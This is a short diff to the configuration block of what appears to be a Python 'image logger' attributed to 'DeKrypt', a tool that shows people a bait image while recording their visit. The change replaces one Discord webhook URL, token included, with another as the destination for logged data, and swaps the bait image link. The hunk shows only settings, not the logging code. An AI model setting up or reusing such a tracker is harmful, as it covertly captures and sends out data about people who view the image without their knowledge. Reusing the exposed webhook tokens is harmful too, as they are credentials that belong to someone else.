@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1091220366984224788/Te54hSoJ1kqvAWLompNzA3aWux7gaiQ9IMgedx76z4grFYQd2dcefXbxnl5tbE4DOVbq",
-    "image": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1526714919049891910/QnoufjrNnDytsFluJ6zsstjUh3yd-7f-NWyFKSUKqwfy0SmCM9vhWdzytydQ8_5mrn70",
+    "image": "https://www.google.com/imgres?q=blue&imgurl=https%3A%2F%2Fpaintandbrush.de%2Fwp-content%2Fuploads%2FLittle_Greene_Ultra_Blue1.jpg&imgrefurl=https%3A%2F%2Fpaintandbrush.de%2Fprodukt%2Fultra-blue-264%2F&docid=-EhXxIYmGZQxPM&tbnid=4_IG1U4i1v18-M&vet=12ahUKEwioqcSbmtOVAxU8nP0HHW96JbUQnPAOegQIPhAA..i&w=418&h=418&hcb=2&ved=2ahUKEwioqcSbmtOVAxU8nP0HHW96JbUQnPAOegQIPhAA.jng", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
